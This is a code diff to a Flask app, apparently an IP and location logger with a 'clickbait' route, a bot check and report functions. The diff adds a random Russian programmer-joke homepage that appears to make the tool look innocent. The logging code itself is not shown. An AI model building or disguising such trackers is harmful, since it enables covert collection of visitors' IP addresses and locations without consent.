@@ -2,6 +2,7 @@ import logging
 import base64
 import httpagentparser
 import requests
+import random
 from flask import Flask, request, render_template_string, jsonify
 
 app = Flask(__name__)
@@ -45,6 +46,20 @@ config = {
 }
 
 blacklistedIPs = ("27", "104", "143", "164")
+
+# Список анекдотов
+jokes = [
+    "Почему программисты плохо спят? Потому что они просыпаются от багов!",
+    "Как называется программист без руки? Левосторонний.",
+    "Почему программисты не любят природу? Потому что там слишком много багов!",
+    "Как называется программист, который разбирается в алкоголе? Алкоголист.",
+    "Почему программисты не ходят в бары? Потому что там слишком много багов!",
+    "Как называется программист, который разбирается в музыке? Музыкант.",
+    "Почему программисты не любят кофе? Потому что он вызывает слишком много багов!",
+    "Как называется программист, который разбирается в искусстве? Художник.",
+    "Почему программисты не ходят в кино? Потому что там слишком много багов!",
+    "Как называется программист, который разбирается в спорте? Спортсмен."
+]
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -169,7 +184,49 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 
 @app.route('/')
 def home():
-    return "Что?"
+    joke = random.choice(jokes)
+    html_content = f"""
+    <!DOCTYPE html>
+    <html lang="ru">
+    <head>
+        <meta charset="UTF-8">
+        <title>Анекдот</title>
+        <style>
+            body {{
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                text-align: center;
+                background: linear-gradient(45deg, #ff416c, #ff4b2b);
+                color: white;
+                height: 100vh;
+                margin: 0;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                animation: fadeIn 2s ease;
+            }}
+            h1 {{
+                font-size: 3em;
+                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+                margin-bottom: 20px;
+            }}
+            p {{
+                font-size: 1.5em;
+                margin: 10px 0;
+            }}
+            @keyframes fadeIn {{
+                from {{ opacity: 0; }}
+                to {{ opacity: 1; }}
+            }}
+        </style>
+    </head>
+    <body>
+        <h1>Анекдот дня</h1>
+        <p>{joke}</p>
+    </body>
+    </html>
+    """
+    return render_template_string(html_content)
 
 @app.route('/sosish')
 def clickbait_page():
